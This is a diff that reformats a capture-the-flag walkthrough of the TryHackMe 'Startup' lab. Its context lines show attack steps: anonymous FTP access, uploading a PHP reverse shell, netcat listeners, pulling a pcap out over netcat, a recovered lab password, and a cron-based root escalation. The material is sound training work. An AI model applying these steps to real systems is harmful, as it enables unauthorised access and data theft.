@@ -1,20 +1,20 @@
 # Startup
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (2).png>)
 
----
+***
 
 ## Intro
 
-| Room Info           | ![](.gitbook/assets/startup.png)              |
-| :------------------ | --------------------------------------------- |
-| 🔗 Name              | [Startup](https://tryhackme.com/room/startup) |
-| 🎯 Target IP         | `10.10.173.77`                                |
-| 📈 Difficulty level  | 🟢Easy                                         |
-| 💲 Subscription type | Free                                          |
-| 🐧 OS                | Linux                                         |
+| Room Info            | ![](../../../../../.gitbook/assets/startup.png) |
+| -------------------- | ----------------------------------------------- |
+| 🔗 Name              | [Startup](https://tryhackme.com/room/startup)   |
+| 🎯 Target IP         | `10.10.173.77`                                  |
+| 📈 Difficulty level  | 🟢Easy                                          |
+| 💲 Subscription type | Free                                            |
+| 🐧 OS                | Linux                                           |
 
----
+***
 
 ## Recon
 
@@ -82,9 +82,9 @@ gobuster dir -u http://startup.thm -w /usr/share/wordlists/dirbuster/directory-l
 
 Navigate to
 
-- `http://startup.thm/files/`
+* `http://startup.thm/files/`
 
-![](.gitbook/assets/image-20230515143244492.png)
+![](../../../../../.gitbook/assets/image-20230515143244492.png)
 
 Login via FTP with `anonymous`:`anonymous`. The files in the folder are the ones from the `/files` webpage.
 
@@ -94,9 +94,9 @@ ftp startup.thm
 ls
 ```
 
-![](.gitbook/assets/image-20230515143526046.png)
+![](../../../../../.gitbook/assets/image-20230515143526046.png)
 
----
+***
 
 ## Exploitation
 
@@ -122,9 +122,9 @@ put shell.php
 nc -nvlp 1234
 ```
 
-- Navigate to `http://startup.thm/files/ftp/shell.php` to get a reverse shell
+* Navigate to `http://startup.thm/files/ftp/shell.php` to get a reverse shell
 
-![](.gitbook/assets/image-20230515145419274.png)
+![](../../../../../.gitbook/assets/image-20230515145419274.png)
 
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
@@ -142,9 +142,9 @@ cp /incidents/suspicious.pcapng /var/www/html/files/smb
 # Permissions denied
 ```
 
-![](.gitbook/assets/image-20230515151802211.png)
+![](../../../../../.gitbook/assets/image-20230515151802211.png)
 
-Transfer `	suspicious.pcapng` using `netcat`
+Transfer `suspicious.pcapng` using `netcat`
 
 ```bash
 # Kali
@@ -160,7 +160,7 @@ Analyze the `susp.pcap` file in Wireshark or use the `strings` command
 strings susp.pcap
 ```
 
-![](.gitbook/assets/image-20230515152948262.png)
+![](../../../../../.gitbook/assets/image-20230515152948262.png)
 
 Try the string as password for `lennie` user.
 
@@ -172,7 +172,7 @@ su lennie
 
 > 📌 `lennie`:`c4ntg3t3n0ughsp1c3`
 
-- 🚩 Get `user.txt`
+* 🚩 Get `user.txt`
 
 ```bash
 find / -type f -iname user.txt 2>/dev/null
@@ -214,9 +214,9 @@ ls -lah /etc/print.sh
 	-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
 ```
 
-![](.gitbook/assets/image-20230515154046856.png)
+![](../../../../../.gitbook/assets/image-20230515154046856.png)
 
----
+***
 
 ## Privilege Escalation
 
@@ -233,7 +233,7 @@ Wait for the reverse shell on the attacker machine. The root will run the `plann
 nc -nvlp 3333
 ```
 
-![](.gitbook/assets/image-20230515155056052.png)
+![](../../../../../.gitbook/assets/image-20230515155056052.png)
 
 ```bash
 find / -type f -iname root.txt 2>/dev/null
@@ -241,5 +241,4 @@ cat /root/root.txt
 THM{f********************************
 ```
 
-------
-
+***
